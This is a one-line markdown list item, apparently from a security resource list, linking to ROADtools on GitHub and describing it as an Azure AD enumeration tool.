- [ROADtools Azure AD enumeration](https://github.com/dirkjanm/ROADtools)
